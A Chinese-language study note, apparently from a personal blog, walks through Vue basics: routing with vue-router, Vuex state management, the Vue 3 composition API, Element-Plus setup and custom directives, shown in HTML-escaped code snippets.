动态组件&lt;template&gt;  &lt;component :is=&quot;Component&quot;&gt;&lt;/component&gt; &lt;!-- :is来控制当前组件 --&gt;  &lt;button @click=&quot;changeComponent&quot;&gt;切换组件&lt;/button&gt;&lt;/template&gt;&lt;script&gt;import A from &#x27;./components/A.vue&#x27;;import B from &#x27;./components/B.vue&#x27;;export default &#123;  data() &#123;    return &#123;      Component: A, // 初始组件      componentsList: [A, B], // 组件列表      currentIndex: 0, // 当前组件索引    &#125;;  &#125;,  methods: &#123;    changeComponent() &#123;      // 切换组件      this.currentIndex = (this.currentIndex + 1) % this.componentsList.length;      this.Component = this.componentsList[this.currentIndex];    &#125;,  &#125;,&#125;;&lt;/script&gt;

路由路由配置
1.安装路由
npm install --save vue-router@4 #不使用@4的话,createWebHashHistory和createRouter不能同时使用vue create democd demonpm run serve

2.配置独立的路由文件&#x2F;src&#x2F;route&#x2F;index.js
//index.jsimport &#123; createRouter,createWebHashHistory &#125; from &quot;vue-router&quot;;import Home from &#x27;../view/Home.vue&#x27;;/** * 页面的配置信息 * path:路径 * component:组件    */    const routes = [        &#123;path:&#x27;/&#x27;,component:Home&#125;,        //@通常指向src目录;()=&gt;import()属于异步加载,指向这个路径时才会挂载        &#123;path:&#x27;/about&#x27;,component:() =&gt; import(&#x27;@/view/About.vue&#x27;)&#125;    ];const router = createRouter(&#123;        history:createWebHashHistory(),        routes,&#125;);export default router;/** * createWebHashHistory()和createWebHistory()的区别 *  * createWebHashHistory(): * 路径是这样的:/#/path... *      不需要后端配合重定向 *      原理:&lt;a&gt;的锚点链接 * createWebHistory(): *      路径是这样的:/path... *      需要后端配合重定向,不然会404 *      原理:H5 pushState() */

3.在main.js中注册组件
//main.jsimport &#123; createApp &#125; from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import &#x27;./registerServiceWorker&#x27;import router from &#x27;./route&#x27;//在mount前用use(router)注册组件createApp(App).use(router).mount(&#x27;#app&#x27;);




&lt;!-- App.vue --&gt;&lt;template&gt;        &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;		&lt;!-- 路由跳转 --&gt;        &lt;RouterLink to=&quot;/&quot;&gt;首页 |&lt;/RouterLink&gt;        &lt;RouterLink to=&quot;/about&quot;&gt; 关于&lt;/RouterLink&gt;		&lt;!-- 路由的显示入口 --&gt;        &lt;router-view&gt;&lt;/router-view&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        name: &#x27;App&#x27;,&#125;&lt;/script&gt;&lt;style&gt;#app &#123;        font-family: Avenir, Helvetica, Arial, sans-serif;        -webkit-font-smoothing: antialiased;        -moz-osx-font-smoothing: grayscale;        text-align: center;        color: #2c3e50;        margin-top: 60px;&#125;&lt;/style&gt;

传递参数创建vue项目时把Router也勾选上

1.在routers数组中的path:’&#x2F;path&#x2F;:参数名’
2.传递参数:router-link的to中’&#x2F;path&#x2F;参数值’
3.读取参数 
//index.jsimport &#123; createRouter, createWebHashHistory &#125; from &#x27;vue-router&#x27;import HomeView from &#x27;../views/HomeView.vue&#x27;const routes = [  &#123;    path: &#x27;/&#x27;,    name: &#x27;home&#x27;,    component: HomeView  &#125;,  &#123;    path: &#x27;/about&#x27;,    name: &#x27;about&#x27;,    component: () =&gt; import(&#x27;../views/AboutView.vue&#x27;)  &#125;,  &#123;    path:&#x27;/news&#x27;,    //@通常指向src目录;()=&gt;import()属于异步加载,指向这个路径时才会挂载    component: ()=&gt;import(&#x27;@/views/News.vue&#x27;)  &#125;,  &#123;    path:&#x27;/news/details/:name&#x27;,    //@通常指向src目录;()=&gt;import()属于异步加载,指向这个路径时才会挂载    component: ()=&gt;import(&#x27;@/views/NewsDetails.vue&#x27;)  &#125;]const router = createRouter(&#123;  history: createWebHashHistory(),  routes&#125;)export default router

&lt;!-- 读取参数 --&gt;&lt;template&gt;        &lt;h3&gt;平台:&lt;/h3&gt;        &lt;p&gt;&#123;&#123; $route.params.name &#125;&#125;&lt;/p&gt;&lt;/template&gt;

嵌套路由配置在页面配置信息的routes数组中的对象中加上children数组，填上子页面的信息(路径不能有&#x2F;)
如果希望默认打开某个子页面,用redirect重定向
//index.jsimport &#123; createRouter, createWebHashHistory &#125; from &#x27;vue-router&#x27;import HomeView from &#x27;../views/HomeView.vue&#x27;const routes = [  &#123;    path: &#x27;/&#x27;,    name: &#x27;home&#x27;,    component: HomeView  &#125;,  &#123;    path: &#x27;/about&#x27;,    name: &#x27;about&#x27;,    component: () =&gt; import(&#x27;../views/AboutView.vue&#x27;),    //默认的子导航    redirect:&#x27;/about/us&#x27;,    //子导航    children:[      &#123;        //子导航不加/        path:&#x27;us&#x27;,        component: () =&gt; import(&#x27;../views/AboutUs.vue&#x27;)      &#125;,      &#123;        path:&#x27;info&#x27;,        component: () =&gt; import(&#x27;../views/AboutInfo.vue&#x27;)      &#125;    ]  &#125;]const router = createRouter(&#123;  history: createWebHashHistory(),  routes&#125;)export default router

Vue状态管理(Vuex)

store就相当于集中式存储管理
引入步骤1.安装Vuex
cnpm install --save vuex

2.配置文件&#x2F;src&#x2F;store&#x2F;index.js
import &#123; createStore &#125; from &#x27;vuex&#x27;//Vuex的作用就是管理组件间状态的export default createStore(&#123;        //所有状态都放在这里(数据),可以被所有组件读取        state:&#123;                count:0        &#125;&#125;);

3.main.js中use()
import &#123; createApp &#125; from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import &#x27;./registerServiceWorker&#x27;import store from &#x27;@/store&#x27;createApp(App).use(store).mount(&#x27;#app&#x27;)

3.访问数据
&lt;template&gt;        &lt;!-- 方法1 --&gt;        &lt;p&gt;&#123;&#123; $store.state.count &#125;&#125;&lt;/p&gt;        &lt;!-- 方法2 --&gt;        &lt;p&gt;&#123;&#123; count &#125;&#125;&lt;/p&gt;&lt;/template&gt;&lt;script&gt;        // &lt;!-- 方法2 --&gt;        import &#123; mapState &#125; from &#x27;vuex&#x27;;        export default&#123;                computed:&#123;                        ...mapState([&#x27;count&#x27;])                &#125;        &#125;;&lt;/script&gt;



Vue状态管理核心(Vuex)
Getter对Vuex中数据进行过滤
import &#123; createStore &#125; from &#x27;vuex&#x27;export default createStore(&#123;        state: &#123;                count:0        &#125;,        getters: &#123;            	//要传入state                getCount(state)&#123;                        return state.count&gt;0?state.count:&#x27;太小了!!!!!!&#x27;;                &#125;        &#125;,&#125;)

&lt;template&gt;  &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;  &lt;p&gt;访问方法1=&gt;&#123;&#123; $store.getters.getCount &#125;&#125;&lt;/p&gt;  &lt;p&gt;访问方法2=&gt;&#123;&#123; getCount &#125;&#125;&lt;/p&gt;&lt;/template&gt;&lt;script&gt;import &#123; mapGetters &#125; from &#x27;vuex&#x27;export default &#123;  computed:&#123;    ...mapGetters([&#x27;getCount&#x27;])  &#125;&#125;&lt;/script&gt;

Mutation
//index.jsimport &#123; createStore &#125; from &#x27;vuex&#x27;export default createStore(&#123;        state: &#123;                count: 0        &#125;,        mutations: &#123;                addCount(state) &#123;                        state.count++;                &#125;        &#125;&#125;)

调用方法
&lt;template&gt;        &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;        &lt;p&gt;访问方法1=&gt;&#123;&#123; $store.getters.getCount &#125;&#125;&lt;/p&gt;        &lt;p&gt;访问方法2=&gt;&#123;&#123; getCount &#125;&#125;&lt;/p&gt;        &lt;button @click=&quot;addCountHandle&quot;&gt;Click~&lt;/button&gt;&lt;/template&gt;&lt;script&gt;import &#123; mapGetters &#125; from &#x27;vuex&#x27;export default &#123;        computed: &#123;                ...mapGetters([&#x27;getCount&#x27;])        &#125;,        methods: &#123;                addCountHandle() &#123;                        this.$store.commit(&#x27;addCount&#x27;);//this.$store.commit(&#x27;mutations中的方法名&#x27;)                &#125;        &#125;&#125;&lt;/script&gt;&lt;!-- 或者可以这样写 --&gt;&lt;script&gt;import &#123; mapGetters,mapMutations &#125; from &#x27;vuex&#x27;export default &#123;        computed: &#123;                ...mapGetters([&#x27;getCount&#x27;])        &#125;,        methods: &#123;                ...mapMutations([&#x27;addCount&#x27;]),                addCountHandle() &#123;                        this.addCount();                &#125;        &#125;&#125;&lt;/script&gt;

Action
import &#123; createStore &#125; from &#x27;vuex&#x27;import axios from &#x27;axios&#x27;export default createStore(&#123;        state: &#123;                count: 0        &#125;,        getters: &#123;                getCount(state) &#123;                        return state.count &gt; 0 ? state.count : &#x27;太小了!!!!!!&#x27;;                &#125;        &#125;,        mutations: &#123;                addCount(state) &#123;                        state.count++;                &#125;        &#125;,    	//只能异步        actions: &#123;                //&#123;commit&#125;:固定写法                asyncAddCount(&#123; commit &#125;) &#123;                        axios.get(&#x27;&#x27;)//axios封装网络请求                        .then(                                res=&gt;&#123;                                        commit(&#x27;addCount&#x27;);                                &#125;                        )                &#125;        &#125;&#125;)

&lt;template&gt;        &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;        &lt;p&gt;访问方法1=&gt;&#123;&#123; $store.getters.getCount &#125;&#125;&lt;/p&gt;        &lt;p&gt;访问方法2=&gt;&#123;&#123; getCount &#125;&#125;&lt;/p&gt;        &lt;button @click=&quot;addCountHandle&quot;&gt;Click~&lt;/button&gt;        &lt;button @click=&quot;AsyncAddCountHandle&quot;&gt;Click~&lt;/button&gt;&lt;/template&gt;&lt;script&gt;import &#123; mapGetters,mapMutations &#125; from &#x27;vuex&#x27;export default &#123;        computed: &#123;                ...mapGetters([&#x27;getCount&#x27;])        &#125;,        methods: &#123;                ...mapMutations([&#x27;addCount&#x27;]),                addCountHandle() &#123;                        this.addCount();                &#125;,                AsyncAddCountHandle()&#123;                        this.$store.dispatch(&#x27;asyncAddCount&#x27;);                &#125;        &#125;&#125;&lt;/script&gt;

Vue3新特性
ref或reactive组合式API替换data(){},在setup()中声明变量（必须return）
vue2.x中在data的return中声明
&lt;template&gt;        &lt;h3&gt;vue3特性&lt;/h3&gt;        &lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt;&lt;/template&gt;&lt;script&gt;        export default&#123;                data()&#123;                        return&#123;                                message:&quot;message&quot;                        &#125;                &#125;        &#125;&lt;/script&gt;

用ref或reactive进行声明
&lt;template&gt;        &lt;h3&gt;vue3特性&lt;/h3&gt;        &lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt;        &lt;ul&gt;                &lt;li v-for=&quot;(item,index) in name.list&quot; :key=&quot;index&quot;&gt;&#123;&#123; item &#125;&#125;&lt;/li&gt;        &lt;/ul&gt;&lt;/template&gt;&lt;script&gt;import &#123;reactive, ref&#125; from &#x27;vue&#x27;        export default&#123;                //组合式API必须要有setup                setup()&#123;                        //ref                        const message = ref(&quot;ref&quot;);                        //reactive:用于对象                        const name = reactive(&#123;                                list:[&#x27;111&#x27;,&#x27;222&#x27;,&#x27;333&#x27;]                        &#125;)                        //必须return                        return&#123;                                message,                                name//name是一个对象，要访问的是name.list                        &#125;                &#125;        &#125;&lt;/script&gt;

methods中定义的方法写在setup()&lt;template&gt;        &lt;h3&gt;vue3特性&lt;/h3&gt;        &lt;button @click=&quot;Increment&quot;&gt;count = &#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;script&gt;import &#123; reactive, ref &#125; from &#x27;vue&#x27;export default &#123;        //组合式API必须要有setup        setup() &#123;                let count = ref(0);                const Increment = () =&gt; &#123;                        //ref返回的是一个对象,要访问它的值需要.value                        count.value += 1;                &#125;;                return &#123;                        count,                    //函数作为变量返回                        Increment                &#125;        &#125;&#125;&lt;/script&gt;

setup()中使用props和content
&lt;template&gt;        &lt;h3&gt;vue3特性&lt;/h3&gt;        &lt;button @click=&quot;Increment&quot;&gt;count = &#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;script&gt;import &#123; reactive, ref &#125; from &#x27;vue&#x27;export default &#123;        //组合式API必须要有setup        setup(props) &#123;                //props是一个Proxy代理对象        &#125;&#125;&lt;/script&gt;


&lt;template&gt;        &lt;h3&gt;vue3特性&lt;/h3&gt;&lt;/template&gt;&lt;script&gt;// import &#123; reactive, ref &#125; from &#x27;vue&#x27;export default &#123;        //这步不能省略        props: &#123;                message: String//只需要声明类型        &#125;,        setup(props) &#123;                console.log(props.message)        &#125;&#125;&lt;/script&gt;&lt;template&gt;        &lt;HelloWorld message=&quot;msg&quot; /&gt;&lt;/template&gt;&lt;script&gt;import HelloWorld from &#x27;./components/HelloWorld.vue&#x27;;export default &#123;        components:&#123;                HelloWorld        &#125;&#125;&lt;/script&gt;

&lt;template&gt;        &lt;h3&gt;vue3特性&lt;/h3&gt;        &lt;h3&gt;&#123;&#123; msg &#125;&#125;&lt;/h3&gt;&lt;/template&gt;&lt;script&gt;// import &#123; reactive, ref &#125; from &#x27;vue&#x27;export default &#123;        //这步不能省略        props: &#123;                message: String//只需要声明类型        &#125;,        setup(props) &#123;                //也通过这样声明，返回回去可以显示在页面上                const msg = props.message;                return &#123;                        msg,                &#125;        &#125;&#125;&lt;/script&gt;

setup中无法使用this获取实例对象，使用content可以获取实例对象
setup()中使用生命周期函数优势：setup中可以同时存在多个生命周期函数

&lt;template&gt;        &lt;h3&gt;vue3特性&lt;/h3&gt;        &lt;h3&gt;&#123;&#123; msg &#125;&#125;&lt;/h3&gt;&lt;/template&gt;&lt;script&gt;import &#123; onBeforeMount, onBeforeUnmount, onBeforeUpdate, onMounted, onUnmounted, onUpdated &#125; from &#x27;vue&#x27;;export default &#123;        setup() &#123;                //内部是箭头函数                onMounted(() =&gt; &#123;                        console.log(&#x27;onMounted1&#x27;);                                        &#125;),                onMounted(() =&gt; &#123;                        console.log(&#x27;onMounted2&#x27;);                &#125;),                onBeforeMount(() =&gt; &#123;                &#125;),                onUpdated(() =&gt; &#123;                &#125;),                onBeforeUpdate(() =&gt; &#123;                &#125;),                onUnmounted(() =&gt; &#123;                &#125;),                onBeforeUnmount(() =&gt; &#123;                &#125;)        &#125;&#125;&lt;/script&gt;

Provide&#x2F;Inject
可以跨层级传递，但是必须从上至下
&lt;!-- HelloWorld.vue --&gt;&lt;template&gt;        &lt;h3&gt;&#123;&#123; msg &#125;&#125;&lt;/h3&gt;&lt;/template&gt;&lt;script&gt;import &#123; inject &#125; from &#x27;vue&#x27;;        export default&#123;                setup()&#123;                        const msg = inject(&quot;msg&quot;);                        return&#123;                                msg                        &#125;                &#125;        &#125;&lt;/script&gt;&lt;!-- App.vue --&gt;&lt;template&gt;        &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;        &lt;HelloWorld/&gt;&lt;/template&gt;&lt;script&gt;import &#123; provide &#125; from &#x27;vue&#x27;;import HelloWorld from &#x27;./components/HelloWorld.vue&#x27;export default &#123;        name: &#x27;App&#x27;,        components: &#123;                HelloWorld        &#125;,        setup() &#123;                provide(&quot;msg&quot;,&quot;provide的消息&quot;)        &#125;&#125;&lt;/script&gt;&lt;style&gt;#app &#123;        font-family: Avenir, Helvetica, Arial, sans-serif;        -webkit-font-smoothing: antialiased;        -moz-osx-font-smoothing: grayscale;        text-align: center;        color: #2c3e50;        margin-top: 60px;&#125;&lt;/style&gt;

Fragment
Element-Plus官网:https://element-plus.sxtxhy.com/zh-CN/
安装npm install element-plus --save

完整引入
//main.jsimport &#123; createApp &#125; from &#x27;vue&#x27;import ElementPlus from &#x27;element-plus&#x27;//引入组件import &#x27;element-plus/dist/index.css&#x27;//必须引入css样式import App from &#x27;./App.vue&#x27;import &#x27;./registerServiceWorker&#x27;createApp(App).use(ElementPlus).mount(&#x27;#app&#x27;)//.use挂载组件

在官网上复制相关组件的代码
按需引入
npm install -D unplugin-vue-components unplugin-auto-import


//vue.config.jsconst &#123; defineConfig &#125; = require(&#x27;@vue/cli-service&#x27;)const AutoImport = require(&#x27;unplugin-auto-import/webpack&#x27;)const Components = require(&#x27;unplugin-vue-components/webpack&#x27;)const &#123; ElementPlusResolver &#125; = require(&#x27;unplugin-vue-components/resolvers&#x27;)module.exports = defineConfig(&#123;  transpileDependencies: true,  configureWebpack: &#123;    plugins: [      AutoImport(&#123;        resolvers: [ElementPlusResolver()]      &#125;),      Components(&#123;        resolvers: [ElementPlusResolver()]      &#125;)    ]  &#125;&#125;)



加载字体图标npm update unplugin-auto-import unplugin-vue-componentsnpm install @element-plus/icons-vue

全局注册创建&#x2F;src&#x2F;plugins&#x2F;icon.js

//icon.jsimport * as components from &quot;@element-plus/icons-vue&quot;;export default &#123;        install: (app) =&gt; &#123;                for (const key in components) &#123;                        const componentConfig = components[key];                        app.component(componentConfig.name, componentConfig);                &#125;        &#125;,&#125;;

//main.jsimport &#123; createApp &#125; from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import &#x27;./registerServiceWorker&#x27;import &#x27;element-plus/dist/index.css&#x27;import icon from &#x27;./plugins/icon&#x27;//引入icon.jscreateApp(App).use(icon).mount(&#x27;#app&#x27;)

然后从官网复制图像的代码
Vue应用应用实例
Vue的实例对象有且仅有一个
根组件
挂载应用
#app会去index.html(与src同级)中寻找dom元素app

&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;        &lt;title&gt;Vue&lt;/title&gt;&lt;/head&gt;&lt;body&gt;        &lt;div id=&quot;app&quot;&gt;                111        &lt;/div&gt;        &lt;script type=&quot;module&quot; src=&quot;/src/main.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;



公共资源
两种风格的API选项式API
npm init vue@latest

&lt;template&gt;        &lt;button @click=&quot;Increment&quot;&gt;count = &#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data() &#123;                return &#123;                        count: 0                &#125;        &#125;,        methods: &#123;                Increment() &#123;                        this.count++;                &#125;        &#125;&#125;&lt;/script&gt;&lt;template&gt;  &lt;Options /&gt;&lt;/template&gt;&lt;script&gt;import Options from &#x27;./components/Options.vue&#x27;;export default&#123;  components:&#123;    Options  &#125;&#125;&lt;/script&gt;



组合式API
&lt;template&gt;        &lt;button @click=&quot;Increment&quot;&gt;count = &#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;!-- 使用 &lt;script setup&gt; 语法糖，不用显式返回对象 --&gt;&lt;script setup&gt;        import &#123;ref,onMounted&#125; from &#x27;vue&#x27;        const count = ref(0);        function Increment()&#123;                count.value ++;        &#125;        onMounted(()=&gt;&#123;        &#125;)&lt;/script&gt;

简约写法&lt;script setup&gt;&lt;/script&gt;

是一种语法糖，不用在setup()中显式return,直接在template中{{ }}调用就行，但是就不能组合式与选项式混写，只能组合式

组合式与选项式的区别
响应式组合式&lt;template&gt;        &lt;h3&gt;&#123;&#123; message &#125;&#125;&lt;/h3&gt;&lt;br&gt;        &lt;h3&gt;&#123;&#123; obj.name &#125;&#125;&lt;/h3&gt;&lt;/template&gt;&lt;!-- &lt;script setup&gt;语法糖，不用显示return&#123;&#125; --&gt;&lt;script setup&gt;import &#123; reactive, ref &#125; from &#x27;vue&#x27;;const message=ref(&quot;Com~&quot;);const obj = reactive(&#123;        name:&quot;jellycat&quot;,        message:message&#125;)&lt;/script&gt;



选项式&lt;template&gt;        &lt;h3&gt;&#123;&#123; message &#125;&#125;&lt;/h3&gt;&lt;br&gt;&lt;/template&gt;&lt;script&gt;        export default&#123;                data()&#123;                        return&#123;                                message:&quot;Options!&quot;                        &#125;                &#125;        &#125;&lt;/script&gt;

计算属性组合式&lt;template&gt;        &lt;h3&gt;Com-reverse:&#123;&#123; res &#125;&#125;&lt;/h3&gt;&lt;/template&gt;&lt;script setup&gt;        import &#123; ref,computed &#125; from &#x27;vue&#x27;;        const message = ref(&quot;Hello World!&quot;);        const res = computed(() =&gt;&#123;                //调用ref对象的值必须.value                return message.value.split(&quot;&quot;).reverse().join(&#x27;&#x27;);        &#125;)&lt;/script&gt;


优势：可以把内容单独拆到一个文件中
eg：
import &#123; computed &#125; from &#x27;vue&#x27;;export function MyDemo(message) &#123;        const demo =  computed(() =&gt; &#123;                return message.value + &quot;114514&quot;;        &#125;)        return demo&#125;

&lt;template&gt;        &lt;h3&gt;Com-reverse:&#123;&#123; res &#125;&#125;&lt;/h3&gt;        &lt;h3&gt;demo:&#123;&#123; res1 &#125;&#125;&lt;/h3&gt;&lt;/template&gt;&lt;script setup&gt;        import &#123; ref,computed &#125; from &#x27;vue&#x27;;        import &#123;MyDemo&#125; from &#x27;./Comcomputedsingle&#x27;//引入函数        const message = ref(&quot;Hello World!&quot;);        const res = computed(() =&gt;&#123;                //调用ref对象的值必须.value                return message.value.split(&quot;&quot;).reverse().join(&#x27;&#x27;);        &#125;)        const res1 = MyDemo(message);&lt;/script&gt;



选项式&lt;template&gt;        &lt;h3&gt;Opt-Reverse:&#123;&#123; Fliter &#125;&#125;&lt;/h3&gt;&lt;/template&gt;&lt;script&gt;export default&#123;        data()&#123;                return &#123;                        message:&quot;Hello World!&quot;                &#125;        &#125;,        computed:&#123;                Fliter()&#123;                        return this.message.split(&quot;&quot;).reverse().join();                &#125;        &#125;&#125;&lt;/script&gt;

组合式API_事件处理&lt;template&gt;        &lt;button @click=&quot;Increment&quot;&gt;选项式API:Count = &#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;br&gt;&lt;/template&gt;&lt;script&gt;export default&#123;        data()&#123;                return&#123;                        count:0                &#125;        &#125;,        methods:&#123;                Increment()&#123;                        this.count++                &#125;        &#125;&#125;&lt;/script&gt;&lt;template&gt;        &lt;button @click=&quot;Increment&quot;&gt;组合式API: count = &#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;script setup&gt;         import &#123;ref&#125; from &#x27;vue&#x27;         const count = ref(0);         function Increment()&#123;                count.value++;         &#125;&lt;/script&gt;

组合式API_侦听器
&lt;template&gt;        &lt;button @click=&quot;Increment&quot;&gt;&#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;script&gt;        export default&#123;                data()&#123;                        return&#123;                                count:0                        &#125;                &#125;,                methods:&#123;                        Increment()&#123;                                this.count++                        &#125;                &#125;,                watch:&#123;                        //方法名就是要监听的变量                        count(OldValue,NewValue)&#123;                                console.log(OldValue,NewValue);                        &#125;                &#125;        &#125;&lt;/script&gt;

&lt;template&gt;        &lt;button @click=&quot;Increment&quot;&gt;&#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;script setup&gt;        import &#123;ref,watch&#125; from &#x27;vue&#x27;        count = ref(0);        function Increment()&#123;                count.value++        &#125;;        //参数1:要监听的变量,残数2:带两个参数的箭头函数        watch(count,(OldValue,NewValue) =&gt; &#123;                console.log(OldValue,NewValue);        &#125;)&lt;/script&gt;

将侦听器放到单独一个文件中
import &#123;watch&#125; from &#x27;vue&#x27;export function Watcher(count)&#123;        watch(count,(OldValue,NewValue) =&gt; &#123;                console.log(OldValue,NewValue);                        &#125;)&#125;

注意:watch监听时，ref对象不需要.value
组合式API_生命周期&lt;!-- 选项式 --&gt;&lt;template&gt;&lt;/template&gt;&lt;script&gt;export default&#123;        beforeCreate()&#123;        &#125;,        created()&#123;        &#125;,        beforeMount()&#123;        &#125;,        mounted()&#123;        &#125;,        beforeUpdate()&#123;        &#125;,        updated()&#123;        &#125;,        beforeUnmount()&#123;        &#125;,        unmounted()&#123;                        &#125;&#125;&lt;/script&gt;

&lt;!-- 组合式API,优点是可以同时存在多个生命周期函数 --&gt;&lt;template&gt;&lt;/template&gt;&lt;script&gt;        import &#123; onMounted, onUpdated &#125; from &#x27;vue&#x27;        onMounted(() =&gt; &#123;        &#125;),        onUpdated(() =&gt; &#123;        &#125;)&lt;/script&gt;

组合式API_模板引用&lt;!-- 组合式API --&gt;&lt;template&gt;        &lt;h3 ref=&quot;message&quot;&gt;Opt&lt;/h3&gt;&lt;/template&gt;&lt;script&gt;        export default&#123;                mounted()&#123;                        this.$refs.message.innerHTML=&#x27;OOOppt&#x27;;                &#125;        &#125;&lt;/script&gt;

&lt;!-- 选项式API --&gt;&lt;template&gt;        &lt;h3 ref=&quot;message&quot;&gt;Com&lt;/h3&gt;&lt;/template&gt;&lt;script setup&gt;        import &#123;ref,onMounted&#125; from &#x27;vue&#x27;        //获取原生DOM,声明一个ref来存放该元素的引用，必须和模板中的ref同名，否则读取不到        const message = ref(null);        //修改DOM内容前提是页面已渲染，所以该操作要放在生命周期函数中        onMounted(()=&gt;&#123;                message.value.innerHTML = &#x27;CCCOOM&#x27;;        &#125;)        &lt;/script&gt;

组合式API_Props&lt;!-- 选项式API父组件 --&gt;&lt;template&gt;        &lt;OptChild msg=&quot;114514&quot; /&gt;&lt;/template&gt;&lt;script&gt;        import OptChild from &#x27;./OptChild.vue&#x27;        export default&#123;                components:&#123;                        OptChild,                &#125;        &#125;&lt;/script&gt;&lt;!-- 选项式API子组件 --&gt;&lt;template&gt;        &lt;p&gt;&#123;&#123; msg &#125;&#125;&lt;/p&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        props: &#123;                msg: &#123;                        type: String,                        default: &quot;&quot;                &#125;,        &#125;&#125;&lt;/script&gt;

&lt;!-- 组合式API父组件 --&gt;&lt;template&gt;        &lt;!-- 不用再去export default中挂载组件 --&gt;        &lt;ComChild msg=&quot;1919810&quot;/&gt;&lt;/template&gt;&lt;script setup&gt;        import ComChild from &#x27;./ComChild.vue&#x27;;&lt;/script&gt;&lt;!-- 组合式API子组件 --&gt;&lt;template&gt;        &lt;p&gt;&#123;&#123; msg &#125;&#125;&lt;/p&gt;&lt;/template&gt;&lt;script setup&gt;        //defineProps的方式进行接收,内部是对象的形式        defineProps(&#123;                msg:&#123;                        type:String,                        default:&quot;&quot;                &#125;,        &#125;);&lt;/script&gt;

组合式API_事件&lt;!-- 选项式API子组件 --&gt;&lt;template&gt;        &lt;button @click=&quot;sendMsg&quot;&gt;发送数据&lt;/button&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data()&#123;                return&#123;                        message:&quot;114514&quot;                &#125;        &#125;,        methods:&#123;                sendMsg()&#123;                        this.$emit(&#x27;OnEvent&#x27;,this.message);                &#125;        &#125;&#125;&lt;/script&gt;&lt;!-- 选项式API父组件 --&gt;&lt;template&gt;        &lt;OptChild @onSomeEvent=&quot;acpt&quot; /&gt;        &lt;p&gt;接收数据:&#123;&#123; message &#125;&#125;&lt;/p&gt;&lt;/template&gt;&lt;script&gt;        import OptChild from &#x27;./OptChild.vue&#x27;;        export default&#123;                components:&#123;                        OptChild,                &#125;,                data()&#123;                        return&#123;                                message:&quot;&quot;                        &#125;                &#125;,                methods:&#123;                        acpt(data)&#123;                                this.message = data;                        &#125;                &#125;        &#125;&lt;/script&gt;

&lt;!-- 组合式API父组件 --&gt;&lt;template&gt;        &lt;ComChild @onEvent=&quot;getMsg&quot; /&gt;        &lt;p&gt;收到数据&#123;&#123; message &#125;&#125;&lt;/p&gt;&lt;/template&gt;&lt;script setup&gt;        import ComChild from &#x27;./ComChild.vue&#x27;;        import &#123;ref&#125; from &#x27;vue&#x27;        const message = ref(&quot;&quot;);        function getMsg(data)&#123;                message.value = data;                // console.log(data);                        &#125;&lt;/script&gt;&lt;!-- 组合式API子组件 --&gt;&lt;template&gt;        &lt;button @click=&quot;sendMsg&quot;&gt;获取数据&lt;/button&gt;&lt;/template&gt;&lt;script setup&gt;        import &#123;ref&#125; from &#x27;vue&#x27;        const message = ref(&quot;1919810&quot;);        //相当于获取this.$emit        const emit = defineEmits([&quot;onEvent&quot;]);        function sendMsg()&#123;                emit(&quot;onEvent&quot;,message.value);        &#125;&lt;/script&gt;

自定义指令选项式&lt;template&gt;        &lt;!-- 用v-自定义指令来调用自定义指令 --&gt;        &lt;h3 v-jellycat&gt;hello world&lt;/h3&gt;&lt;/template&gt;&lt;script&gt;        export default&#123;                //通过directives创建自定义指令                directives:&#123;                        //指令名                        jellycat:&#123;                                //指令要做什么                                mounted(element)&#123;                                        console.log(element);                                                                        &#125;                        &#125;                &#125;        &#125;&lt;/script&gt;



组合式&lt;template&gt;        &lt;span v-jellycat&gt;hello&lt;/span&gt;&lt;/template&gt;&lt;script setup&gt;        // 前面+v表示自定义指令        const vJellycat = &#123;                //注意写法 mouted:                mounted:(element) =&gt; &#123;                        console.log(element);                                                // 内部逻辑                &#125;        &#125;&lt;/script&gt;

全局与局部自定义指令
局部&lt;template&gt;        &lt;h3 v-scp&gt;Scoped&lt;/h3&gt;&lt;/template&gt;&lt;script setup&gt;        const vScp = &#123;                mounted(element)&#123;                        element.style.color = &quot;green&quot;                &#125;        &#125;&lt;/script&gt;

全局需要在main.js中创建自定义指令
import &#x27;./assets/main.css&#x27;import &#123; createApp &#125; from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;const app = createApp(App);//参数1:指令名 参数2:箭头函数,指令实现的功能app.directive(&quot;glb&quot;,(Element) =&gt; &#123;        Element.style.color = &quot;blue&quot;&#125;)app.mount(&#x27;#app&#x27;)

自定义指令的钩子函数


参数
eg.模拟v-show
&lt;template&gt;        &lt;p v-myShow=&quot;true&quot;&gt;11&lt;/p&gt;&lt;/template&gt;&lt;script setup&gt;import &#123;ref&#125; from &#x27;vue&#x27;const flag = ref(true)        const vMyShow = &#123;                mounted(el,binding,vNode,prevNode)&#123;                        if(binding.value)&#123;                                el.style.display = &#x27;block&#x27;;                        &#125;else&#123;                                el.style.display = &#x27;none&#x27;;                        &#125;                &#125;        &#125;&lt;/script&gt;

]]></content>
      <categories>
        <category>Web开发</category>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Web开发</tag>
        <tag>Vue</tag>
      </tags>
